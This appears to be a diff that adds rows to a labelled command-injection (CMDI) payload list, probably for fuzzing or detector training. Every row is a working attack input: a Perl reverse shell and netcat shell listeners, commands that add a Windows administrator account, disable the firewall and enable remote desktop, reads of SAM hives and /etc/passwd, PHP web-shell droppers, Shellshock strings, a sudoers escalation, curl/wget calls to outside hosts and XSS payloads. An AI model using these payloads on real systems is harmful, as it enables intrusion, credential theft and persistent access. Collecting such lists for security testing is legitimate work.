+"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
+| ls -l /home/*,CMDI
+| ls -l /home/*,CMDI
+| ls -l /home/*,CMDI
+| ls -l /home/*,CMDI
+| ls -l /tmp,CMDI
+| ls -l /tmp,CMDI
+| ls -l /tmp,CMDI
+| ls -l /tmp,CMDI
+| ls -l /var/www/*,CMDI
+| ls -l /var/www/*,CMDI
+| ls -l /var/www/*,CMDI
+| ls -l /var/www/*,CMDI
+| ls -laR /etc,CMDI
+| ls -laR /etc,CMDI
+| ls -laR /etc,CMDI
+| ls -laR /etc,CMDI
+| ls -laR /var/www,CMDI
+| ls -laR /var/www,CMDI
+| ls -laR /var/www,CMDI
+| ls -laR /var/www,CMDI
+| nc -lvvp 4444 -e /bin/sh|,CMDI
+| nc -lvvp 4444 -e /bin/sh|,CMDI
+| nc -lvvp 4444 -e /bin/sh|,CMDI
+| nc -lvvp 4444 -e /bin/sh|,CMDI
+| net localgroup Administrators hacker /ADD,CMDI
+| net localgroup Administrators hacker /ADD,CMDI
+| net localgroup Administrators hacker /ADD,CMDI
+| net localgroup Administrators hacker /ADD,CMDI
+| net user hacker Password1 /ADD,CMDI
+| net user hacker Password1 /ADD,CMDI
+| net user hacker Password1 /ADD,CMDI
+| net user hacker Password1 /ADD,CMDI
+| netsh firewall set opmode disable,CMDI
+| netsh firewall set opmode disable,CMDI
+| netsh firewall set opmode disable,CMDI
+| netsh firewall set opmode disable,CMDI
+"| perl -e 'print ""X""x16096'",CMDI
+"| perl -e 'print ""X""x16096'",CMDI
+"| perl -e 'print ""X""x16096'",CMDI
+"| perl -e 'print ""X""x16096'",CMDI
+"| perl -e 'print ""X""x4096'",CMDI
+"| perl -e 'print ""X""x4096'",CMDI
+"| perl -e 'print ""X""x4096'",CMDI
+"| perl -e 'print ""X""x4096'",CMDI
+"| perl -e 'print ""X""x8096'",CMDI
+"| perl -e 'print ""X""x8096'",CMDI
+"| perl -e 'print ""X""x8096'",CMDI
+"| perl -e 'print ""X""x8096'",CMDI
+"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
+"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
+"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
+"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
+| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
+| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
+| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
+| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
+| system('sleep 5');,CMDI
+| system('sleep 5');,CMDI
+| system('sleep 5');,CMDI
+| system('sleep 5');,CMDI
+| systeminfo,CMDI
+| systeminfo,CMDI
+| systeminfo,CMDI
+| systeminfo,CMDI
+| type %SYSTEMROOT%\repair\SAM,CMDI
+| type %SYSTEMROOT%\repair\SAM,CMDI
+| type %SYSTEMROOT%\repair\SAM,CMDI
+| type %SYSTEMROOT%\repair\SAM,CMDI
+| type %SYSTEMROOT%\repair\SYSTEM,CMDI
+| type %SYSTEMROOT%\repair\SYSTEM,CMDI
+| type %SYSTEMROOT%\repair\SYSTEM,CMDI
+| type %SYSTEMROOT%\repair\SYSTEM,CMDI
+| type C:\Windows\repair\SAM,CMDI
+| type C:\Windows\repair\SAM,CMDI
+| type C:\Windows\repair\SAM,CMDI
+| type C:\Windows\repair\SAM,CMDI
+| type C:\Windows\repair\SYSTEM,CMDI
+| type C:\Windows\repair\SYSTEM,CMDI
+| type C:\Windows\repair\SYSTEM,CMDI
+| type C:\Windows\repair\SYSTEM,CMDI
+| type C:\WINNT\repair\SAM,CMDI
+| type C:\WINNT\repair\SAM,CMDI
+| type C:\WINNT\repair\SAM,CMDI
+| type C:\WINNT\repair\SAM,CMDI
+| wget http://crowdshield.com/.testing/rce.txt,CMDI
+| wget http://crowdshield.com/.testing/rce.txt,CMDI
+| wget http://crowdshield.com/.testing/rce.txt,CMDI
+| wget http://crowdshield.com/.testing/rce.txt,CMDI
+|+ping+|',CMDI
+"|| perl -e 'print ""X""x16096'",CMDI
+"|| perl -e 'print ""X""x16096'",CMDI
+"|| perl -e 'print ""X""x16096'",CMDI
+"|| perl -e 'print ""X""x16096'",CMDI
+"|| perl -e 'print ""X""x4096'",CMDI
+"|| perl -e 'print ""X""x4096'",CMDI
+"|| perl -e 'print ""X""x4096'",CMDI
+"|| perl -e 'print ""X""x4096'",CMDI
+"|| perl -e 'print ""X""x8096'",CMDI
+"|| perl -e 'print ""X""x8096'",CMDI
+"|| perl -e 'print ""X""x8096'",CMDI
+"|| perl -e 'print ""X""x8096'",CMDI
+|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
+|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
+|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
+|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
+|| system('sleep 5');,CMDI
+|| system('sleep 5');,CMDI
+|| system('sleep 5');,CMDI
+|| system('sleep 5');,CMDI
+||/usr/bin/id;,CMDI
+||/usr/bin/id;,CMDI
+||/usr/bin/id;,CMDI
+||/usr/bin/id;,CMDI
+||/usr/bin/id|,CMDI
+||/usr/bin/id|,CMDI
+||/usr/bin/id|,CMDI
+||/usr/bin/id|,CMDI
+||/usr/bin/id|',CMDI
+||+dir|c:\,CMDI
+||echo%20ANSBHE$((26%2B89))$(echo%20ANSBHE)ANSBHE,CMDI
+"||echo%20RWZHCR$((74%2B28))$(echo%20RWZHCR)RWZHCR""",CMDI
+||echo%20XIYAUA$((17%2B90))$(echo%20XIYAUA)XIYAUA',CMDI
+|CMD=$'{cmd}';$CMD,CMDI
+"|CMD=$""{cmd}"";$CMD",CMDI
+|CMD=$\'{cmd}\';$CMD,CMDI
+|echo%20DDLJJW$((33%2B23))$(echo%20DDLJJW)DDLJJW',CMDI
+"|echo%20PRCGGO$((57%2B79))$(echo%20PRCGGO)PRCGGO""",CMDI
+|echo%20TJEGSE$((27%2B57))$(echo%20TJEGSE)TJEGSE,CMDI
+|usr/bin/id\n,CMDI
+|usr/bin/id\n,CMDI
+|usr/bin/id\n,CMDI
+|usr/bin/id\n,CMDI
+$;/usr/bin/id,CMDI
+$;/usr/bin/id,CMDI
+$;/usr/bin/id,CMDI
+$;/usr/bin/id,CMDI
+$;/usr/bin/id,CMDI
+$;/usr/bin/id,CMDI
+$;/usr/bin/id,CMDI
+$;/usr/bin/id,CMDI
+$(`cat /etc/passwd`),CMDI
+$(`cat /etc/passwd`),CMDI
+$(`cat /etc/passwd`),CMDI
+$(`cat /etc/passwd`),CMDI
+$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),CMDI
+$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),CMDI
+$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),CMDI
+$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),CMDI
+$(`dir`),CMDI
+$(`dir`),CMDI
+$(`dir`),CMDI
+$(`dir`),CMDI
+$(`ls`),CMDI
+$(`ls`),CMDI
+$(`ls`),CMDI
+$(`ls`),CMDI
+$(`type C:\boot.ini`),CMDI
+$(`type C:\boot.ini`),CMDI
+$(`type C:\boot.ini`),CMDI
+$(`type C:\boot.ini`),CMDI
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),CMDI
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),CMDI
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),CMDI
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),CMDI
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),CMDI
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),CMDI
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),CMDI
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),CMDI
+$(`whoami`),CMDI
+$(`whoami`),CMDI
+$(`whoami`),CMDI
+$(`whoami`),CMDI
+$(touch /tmp/blns.fail),CMDI
+"${@print(""RCEVulnerable"")}",CMDI
+"${@print(""RCEVulnerable"")}",CMDI
+"${@print(""RCEVulnerable"")}",CMDI
+"${@print(""RCEVulnerable"")}",CMDI
+${@print(system($_SERVER['HTTP_USER_AGENT']))},CMDI
+${@print(system($_SERVER['HTTP_USER_AGENT']))},CMDI
+${@print(system($_SERVER['HTTP_USER_AGENT']))},CMDI
+${@print(system($_SERVER['HTTP_USER_AGENT']))},CMDI
+$%26%26dir c:\,CMDI
+$%26%26dir+c:%255c,CMDI
+$%26%26dir+c:%2f,CMDI
+$+|+Dir+c:\,CMDI
+$+|+Dir+c:%255c,CMDI
+$+|+Dir+c:%2f,CMDI
+$ENV{'HOME'},CMDI
+cat /etc/hosts,CMDI
+cat /etc/hosts,CMDI
+cat /etc/hosts,CMDI
+cat /etc/hosts,CMDI
+cat /etc/passwd,CMDI
+cat /etc/passwd,CMDI
+cat /etc/passwd,CMDI
+cat /etc/passwd,CMDI
+CMD=$'{cmd}';$CMD,CMDI
+"CMD=$""{cmd}"";$CMD",CMDI
+CMD=$\'{cmd}\';$CMD,CMDI
+"Cookie: () { echo ""Hello world""; }",CMDI
+curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",CMDI
+"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",CMDI
+"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",CMDI
+"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",CMDI
+"data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4='",CMDI
+echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,CMDI
+echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,CMDI
+echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,CMDI
+echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,CMDI
+echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,CMDI
+echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,CMDI
+echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,CMDI
+echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,CMDI
+echo '<script>alert(1)</script>'// XXXXXXXXXXX,CMDI
+echo '<script>alert(1)</script>'// XXXXXXXXXXX,CMDI
+echo '<script>alert(1)</script>'// XXXXXXXXXXX,CMDI
+echo '<script>alert(1)</script>'// XXXXXXXXXXX,CMDI
+"echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
+"echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
+"echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
+"echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
+"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",CMDI
+"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",CMDI
+"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",CMDI
+"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",CMDI
+"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
+"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
+"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
+"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
+"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
+"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
+"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
+"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
+"echo python -c '""import os;os.write(3,\""ALL ALL=(ALL) NOPASSWD: ALL\"")""'|DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;sudo su",CMDI
+echo%20AGIYMZ$((69%2B52))$(echo%20AGIYMZ)AGIYMZ,CMDI
+"echo%20GHWFXG$((12%2B72))$(echo%20GHWFXG)GHWFXG""",CMDI
+echo%20IFNPXI$((40%2B99))$(echo%20IFNPXI)IFNPXI',CMDI
+"env 'x=() { :;}; echo vulnerable' 'BASH_FUNC_x()=() { :;}; echo vulnerable' bash -c ""echo test""",CMDI
+"env x='() { :;}; apt-get update && apt-get install --only-upgrade bash' bash -c ""Oops.""",CMDI
+eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),CMDI
+eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),CMDI
+eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),CMDI
+eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),CMDI
+eval('pwd'),CMDI
+eval('pwd'),CMDI
+eval('pwd'),CMDI
+eval('pwd'),CMDI
+eval('pwd');,CMDI
+eval('pwd');,CMDI
+eval('pwd');,CMDI
+eval('pwd');,CMDI
+eval('sleep 5'),CMDI
+eval('sleep 5'),CMDI
+eval('sleep 5'),CMDI
+eval('sleep 5'),CMDI
+eval('sleep 5');,CMDI
+eval('sleep 5');,CMDI
+eval('sleep 5');,CMDI
+eval('sleep 5');,CMDI
+eval('whoami'),CMDI
+eval('whoami'),CMDI
+eval('whoami'),CMDI
+eval('whoami'),CMDI
+eval('whoami');,CMDI
+eval('whoami');,CMDI
+eval('whoami');,CMDI
+eval('whoami');,CMDI
+"eval(""puts 'hello world'"")",CMDI
+exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX